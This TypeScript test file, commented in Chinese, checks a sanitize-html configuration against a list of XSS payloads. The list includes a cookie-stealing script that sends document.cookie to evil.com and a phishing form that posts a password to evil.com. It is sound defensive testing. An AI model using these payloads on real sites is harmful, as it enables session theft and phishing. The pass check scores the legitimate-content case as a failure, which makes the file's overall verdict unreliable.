// __tests__/test-sanitize.ts - 测试 sanitize-html 配置有效性
import sanitizeHtml from 'sanitize-html'

const sanitizeHtmlOptions = {
  allowedTags: [
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'blockquote', 'p', 'a', 'ul', 'ol', 'nl', 'li',
    'b', 'i', 'strong', 'em', 'strike', 'code', 'span',
    'hr', 'br', 'div', 'table', 'thead', 'caption',
    'tbody', 'tr', 'th', 'td', 'pre', 'img', 'del',
    'input', 'label', 'textarea',
  ],
  allowedAttributes: {
    a: ['href', 'title', 'target'],
    img: ['src', 'alt'],
  },
  allowedSchemes: ['http', 'https', 'ftp', 'mailto'],
}

const attacks = [
  { name: '经典XSS - script标签', payload: '<script>alert("XSS")</script>' },
  { name: 'XSS - img onerror', payload: '<img src="x" onerror="alert(\'XSS\')">' },
  { name: 'XSS - javascript:链接', payload: '<a href="javascript:alert(\'XSS\')">点击</a>' },
  { name: 'XSS - svg onload', payload: '<svg onload="alert(\'XSS\')"></svg>' },
  { name: 'XSS - iframe', payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>' },
  { name: 'XSS - div事件处理器', payload: '<div onmouseover="alert(\'XSS\')">悬浮</div>' },
  { name: 'HTML注入 - 窃取Cookie', payload: '<script>fetch("https://evil.com?c="+document.cookie)</script>' },
  { name: 'HTML注入 - 钓鱼表单', payload: '<form action="https://evil.com/login"><input name="password"><button>登录</button></form>' },
  { name: '合法内容 - 应该保留', payload: '<h1>标题</h1><p>段落 <a href="https://alights.cn">链接</a></p>' },
]

console.log('=== sanitize-html 安全性测试 ===\n')
console.log('预期结果：所有攻击被阻止，合法内容保留\n')

let passed = 0
let failed = 0

attacks.forEach((attack, i) => {
  const cleaned = sanitizeHtml(attack.payload, sanitizeHtmlOptions)
  const blocked = cleaned !== attack.payload
  
  console.log(`${i + 1}. ${attack.name}`)
  console.log(`   输入: ${attack.payload}`)
  console.log(`   输出: ${cleaned}`)
  console.log(`   结果: ${blocked ? '✅ 已阻止' : '❌ 未阻止！'}`)
  console.log()
  
  if (blocked) passed++
  else failed++
})

console.log('=== 测试完成 ===')
console.log(`通过: ${passed}/${attacks.length}`)
console.log(`失败: ${failed}/${attacks.length}`)
console.log()
console.log(failed === 0 ? '✅ 所有攻击都被阻止！配置有效！' : '❌ 存在漏洞！需要修复配置！')
